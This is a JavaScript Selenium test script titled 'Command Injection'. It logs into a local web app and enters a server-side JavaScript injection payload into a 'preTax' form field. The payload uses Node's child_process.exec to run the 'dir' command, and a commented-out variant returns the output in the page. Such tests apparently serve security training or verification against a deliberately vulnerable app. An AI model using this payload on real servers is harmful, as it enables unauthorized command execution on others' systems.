const {Builder, By, Key, until, DesiredCapabilities, logging} = require('selenium-webdriver');
const {expect} = require('chai');


const util = require('util');
const fs = require('fs');
const resemble = require('resemblejs');


describe('Command Injection', function () {

    var pref = new logging.Preferences();
    //  pref.setLevel('browser', logging.Level.ALL);
    pref.setLevel('driver', logging.Level.ALL);

    const capabilities = {
        'goog:loggingPrefs': {
            'browser': 'ALL'
        }
    }

    const driver = new Builder().withCapabilities(capabilities).setLoggingPrefs(pref).forBrowser('chrome')
        .build();

    before(async function () {
        const r1 = await driver.get('localhost:4000/login');
        await driver.findElement(By.name('userName')).sendKeys('user1');
        await driver.findElement(By.name('password')).sendKeys('User1_123', Key.ENTER);
    });
    after(async () => {
        //   requester.close();
     //   driver.quit();
    });


    it('Command', async () => {

        driver.manage().logs()
        await driver.findElement(By.id('contributions-menu-link')).click();

        await driver.findElement(By.name("preTax")).clear();
 /*       await driver.findElement(By.name("preTax")).sendKeys(
            ` var exec = require('child_process').exec; `+
            `function execute(command, callback){`+
            `exec("dir", function(error, stdout, stderr){ res.render("contributions", {updateError: stdout,userId: userId}) });}
            `+`execute("dir",'');`,
            Key.ENTER);*/

        await driver.findElement(By.name("preTax")).sendKeys(
            ` var exec = require('child_process').exec; `+
            `function execute(command, callback){`+
            `exec("dir", function(error, stdout, stderr){console.log(stdout); });}
            `+`execute("dir",'');`,
            Key.ENTER);


        /*       debugger
               driver.manage().logs().get('driver').then(function(logs){
                   console.log(logs);
               });*/

    }).timeout(30000);


});
